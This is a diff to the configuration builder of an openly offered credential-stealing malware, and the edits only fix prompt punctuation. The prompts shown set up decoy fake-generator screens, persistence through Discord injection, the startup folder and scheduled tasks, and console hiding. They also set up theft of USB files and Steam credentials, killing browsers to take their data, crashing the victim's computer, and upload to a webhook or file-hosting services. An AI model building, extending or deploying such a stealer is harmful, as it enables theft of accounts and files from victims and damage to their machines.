@@ -134,9 +134,9 @@ while True:
         except:
             print('Invalid Webhook')
 
-    Debug = get_boolean_input('Enable Debugging (Useful to share error (Will print and save error in a txt file)) Y/N ')
+    Debug = get_boolean_input('Enable Debugging (Useful to share error (Will print and save error in a txt file)) Y/N: ')
     FakeWeb = get_boolean_input('Enable Fake Webhook Module (When the file is launched it will show a Webhook Tools while getting data) Y/N: ')
-    FakeGen = get_boolean_input('enable Fake Generator Module (When the file is launched it will show a nitro generator while getting data) Y/N: ')
+    FakeGen = get_boolean_input('Enable Fake Generator Module (When the file is launched it will show a nitro generator while getting data) Y/N: ')
     Injection = get_boolean_input('Inject the script to discord Startup Y/N: ')
     Startup = get_boolean_input('Add the file to the startup folder? Y/N: ')
     Schedule = get_boolean_input('Add an schedule task ? (execute it every day!) Y/N: ')
@@ -147,9 +147,9 @@ while True:
     crasher = get_boolean_input('Do you want the program to make the computer crash after it stole everything? Y/N: ')
     hide = get_boolean_input('Do you want the program to make the console invisible? Y/N: ')
     change = get_boolean_input('Change the user (discord account) about me with custom text? Y/N: ')
-    Drive = get_boolean_input('Steal all connected USB files (may make the stealer slower) Y/N')
-    Kill_process = get_boolean_input('kill process (chrome, brave, firefox, to steal at 100%) Y/N')
-    ArchiStealer = get_boolean_input('Want to steal all config files (retrieve all steam password and username found in ArchiSteamFarm) Y/N')
+    Drive = get_boolean_input('Steal all connected USB files (may make the stealer slower) Y/N: ')
+    Kill_process = get_boolean_input('kill process (chrome, brave, firefox, to steal at 100%) Y/N: ')
+    ArchiStealer = get_boolean_input('Want to steal all config files (retrieve all steam password and username found in ArchiSteamFarm) Y/N: ')
 
     if change:
         bio = input(r'''Input the text you want the user to have in his about me (Right-click to paste) or put \n to skip a line -> ''')
@@ -158,7 +158,7 @@ while True:
         crasher = False
         
     while True:
-        service = input('Which upload services you want to use? (Choose between gofileio, fileio, catboxmoe) (you can choose with 1,2,3 too) :')
+        service = input('Which upload services you want to use? (Choose between gofileio, fileio, catboxmoe) (you can choose with 1,2,3 too): ')
         
         if service.lower() in ['gofile', 'catboxmoe', 'fileio','1','2','3']:
             if service.lower() == 'gofile' or service.lower() == '1':
